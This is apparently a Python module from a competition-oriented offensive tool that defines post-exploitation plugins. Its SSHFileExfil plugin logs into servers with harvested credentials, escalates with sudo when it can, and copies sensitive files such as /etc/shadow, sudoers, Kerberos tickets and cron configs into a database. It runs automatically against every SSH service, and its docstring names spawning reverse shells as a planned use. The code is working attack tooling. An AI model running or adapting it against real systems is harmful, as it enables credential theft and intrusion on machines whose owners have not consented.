"""
Tasks to do after checking/retrieving flags.

These functions **MUST NOT** bubble exceptions. A post
task failing does not mean the protocol has failed,
just any of the fun stuff you want to do afterwards.

Things that belong here:
- grabbing fun (non-flag) files
- spawning reverse shells

Things that don't belong here:
- grabbing flags
"""
import logging
import os
from abc import ABC, abstractmethod
from collections import deque
from typing import Tuple, Type, Dict, List

import paramiko
from schema import Schema, Optional

from flag_slurper.autolib import Service
from .exploit import get_directory, get_file, run_command, run_sudo, expand_wildcard
from .models import Credential, File

logger = logging.getLogger(__name__)

#: Sensitive files to find on systems. Paths
#: ending in / are directories.
SENSITIVE_FILES = [
    # Authentication
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '/etc/sudoers.d/',

    # Kerberos
    '/tmp/krb*',
    '/etc/krb*',
    '/etc/sssd/',

    # Cron
    '/etc/crontab',
    '/etc/cron.d/',
    '/etc/cron.daily/',
    '/etc/cron.hourly/',
    '/etc/cron.monthly/',
    '/etc/cron.weekly/',

    # Shell configs and profiles
    '/etc/skel/',
    '/etc/**/.bashrc',
    '/etc/**/.bash_profile',
    '/etc/**/.zshrc',
    '/etc/**/.profile'
]


class PostContext(dict):
    """
    A wrapper method for passing post pwn methods arbitrary data.

    This allows pwn functions to pass whatever arbitrary data they
    need onto the post plugins in an extensible way.
    """

    def validate(self, schema: dict) -> 'PostContext':
        """
        Allow a plugin to enforce their own schema for
        their context data. The ``Schema`` object is
        created by the context, not the plugin.

        :param schema: A dictionary containing the schema
        :return: Returns the context for chaining
        """
        Schema(schema, ignore_extra_keys=True).validate(self)
        return self


class PostPlugin(ABC):
    """
    Defines a post pwn plugin.

    Plugins are configured in the ``post`` key to a project. For example:

    .. code-block:: yaml

        ---
        _version: "0.1"
        ...
        post:
          - service: WWW SSH
            commands:
              - <post plugin name>:
                  <arguments>
    """

    name = None
    schema = None
    context_schema = None
    config = None

    def configure(self, config: dict) -> dict:
        """
        Configure the plugin.

        This provides the base configuration implementation. It
        simply just validates the schema against the given config.
        Plugins that need more involved configuration may override
        this method.

        Plugins must define their own schema by overriding the
        ``schema`` class variable.


        :param config:
        :return:
        """
        if not self.schema:
            raise ValueError('The schema for {} has not been configured'.format(self.name))
        config = Schema(self.schema).validate(config)
        self.config = config
        logger.info('Configuring plugin: %s', self.config)
        return config

    def unconfigure(self):
        """
        Remove any previous configuration.

        This is used between post exploits.
        """
        self.config = None

    @abstractmethod
    def run(self, service: Service, context: PostContext) -> bool:
        """
        Run the post pwn plugin.

        This is where the plugin will perform any actions it needs. All
        run methods MUST call their super before accessing the given
        context, otherwise it must attempt to safely access context
        entries.

        :param service: The service we are currently attacking
        :param context: The context given to the post plugin
        :returns: True if successful, False otherwise
        :raises ValueError: if the context schema has not been set
        """
        if self.context_schema is None:
            raise ValueError('The context_schema for {} has not been configured'.format(self.name))
        context.validate(self.context_schema)
        return True

    @abstractmethod
    def predicate(self, service: Service, context: PostContext) -> bool:
        """
        Determines whether the plugin should be run for the given service,
        context, and configuration. The plugin's configuration will have
        been validated at this point.

        :param service: The current service to test against
        :param context: The current post context
        :return: True if this plugin should run, False otherwise
        """
        raise NotImplementedError


class PluginRegistry:
    """
    The post pwn plugin registry.

    This handles configuring and figuring out which plugins will
    need to be run.
    """
    def __init__(self):
        self.registry: Dict[str, PostPlugin] = {}

    def register(self, plugin: Type[PostPlugin]):
        """
        Register a plugin with the plugin registry.

        :param plugin: The plugin class to register.
        :raises ValueError: If the plugin does not subclass :py:class:`PostPlugin`.
        :raises ValueError: If the plugin name is already taken.
        """
        if not issubclass(plugin, PostPlugin):
            raise ValueError('Plugins must extend PostPlugin')
        if plugin.name in self.registry:
            raise ValueError('Plugin already registered by this name: {}'.format(plugin.name))
        self.registry[plugin.name] = plugin()

        # The plugins that will be used for the current run
        self.run_plugins = []

    def configure(self, config: List[dict]):
        """
        Configure the plugins that will be used for this run.

        This will accept the ``commands`` section for the current service.

        :param config: The post config for the current service.
        :raises KeyError: When a command is specified that doesn't exist.
        :raises ValueError: When more than one key in a command entry.
        :raises ValueError: When a command uses an unknown plugin.
        """

        # Unconfigure all plugins from a previous run
        list(map(PostPlugin.unconfigure, self.registry.values()))
        self.run_plugins = []

        # Configure used plugins for
        for command in config:
            if len(command.keys()) != 1:
                raise ValueError('Each commands entry should have exactly one key')
            name = list(command.keys())[0]
            if name not in self.registry:
                raise KeyError('Unknown plugin: {}'.format(name))

            plugin = self.registry[name]
            plugin.configure(command[name])
            self.run_plugins.append(name)

    def post(self, service: Service, context: PostContext) -> bool:
        """
        Runs applicable post pwn plugins against the given service,
        with the given context.

        :param service: The service to post pwn
        :param context: The context for the server
        :return: Whether all post invocation were successful
        """
        results = [plugin.run(service, context)
                   for plugin in self.registry.values()
                   if plugin.name in self.run_plugins or plugin.predicate(service, context)]
        return all(results)


class SSHFileExfil(PostPlugin):
    """
    The ``ssh_exfil`` plugin attempt to find as many ``SENSITIVE_FILES`` as possible.

    This plugin takes some optional parameters:

    ``files``: List[str]
        A list of files to look for. All entries ending with a ``/`` are considered directories
        and will be searched.

    ``merge_files``: Boolean
        Set to ``True`` if you want to merge ``files`` with ``SENSITIVE_FILES``, otherwise
        only ``files`` will be searched.

    This plugin will run automatically for all services using port 22.
    """
    name = 'ssh_exfil'
    schema = {
        Optional('files', default=[]): [str],
        Optional('merge_files', default=True): bool,
    }
    context_schema = {
        'ssh': paramiko.SSHClient,
        'credentials': object,
    }

    def run(self, service: Service, context: PostContext):
        super().run(service, context)
        logger.debug('Running post ssh exfil')
        if not self.config:
            self.config = {
                'files': [],
                'merge_files': True,
            }

        credentials: Credential = context['credentials']
        ssh: paramiko.SSHClient = context['ssh']

        def _map_creds(bag):
            return bag.credentials.where(Credential.service == service).get()
        credentials = map(_map_creds, credentials)

        working_creds = filter(lambda c: c.state == Credential.WORKS, credentials)
        for credential in working_creds:
            ssh.connect(service.service_url, service.service_port, credential.bag.username, credential.bag.password)
            self._post(credential, ssh)

    def _post(self, credential: Credential, ssh: paramiko.SSHClient):
        sensitive_files: list = self.config['files']
        if self.config['merge_files']:
            sensitive_files.extend(SENSITIVE_FILES)

        # Stage 0 - Determine access level
        # If we have sudo access, we need to tell the various exploit
        # functions so they can use it.
        sudo = credential.bag.password if credential.sudo else None

        # Stag 1 - Sensitive Files

        def _get_file_info(path: str) -> Tuple[str, str]:
            name_cmd = 'file -b {}'.format(path)
            mime_cmd = 'file -i -b {}'.format(path)
            if sudo:
                _, stdout, _ = run_sudo(ssh, name_cmd, sudo)
                name = stdout.read().decode('utf-8').strip()
                _, stdout, _ = run_sudo(ssh, mime_cmd, sudo)
                mime = stdout.read().decode('utf-8').strip()
            else:
                name = run_command(ssh, name_cmd)
                mime = run_command(ssh, mime_cmd)
            return name, mime

        queue = deque(sensitive_files)
        while len(queue):
            path = queue.pop()

            # Path is a directory
            if path[-1] == '/':
                directory = get_directory(ssh, path, sudo)
                if directory:
                    queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))

            # Path is a wildcard
            elif '*' in path:
                files = expand_wildcard(ssh, path, sudo)
                if files:
                    queue.extend(map(lambda x: x.strip(), files))

            # Path shold be a file
            else:
                if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
                    continue

                info = _get_file_info(path)
                contents = get_file(ssh, path, sudo)
                if contents:
                    File.create(path=path, contents=contents, mime_type=info[1], info=info[0],
                                service=credential.service)
                else:
                    logger.error('There was an error retrieving sensitive file %s: %s', path, contents)
                    return False
        return True

    def predicate(self, service: Service, context: PostContext) -> bool:
        return service.service_port == 22


registry = PluginRegistry()
registry.register(SSHFileExfil)
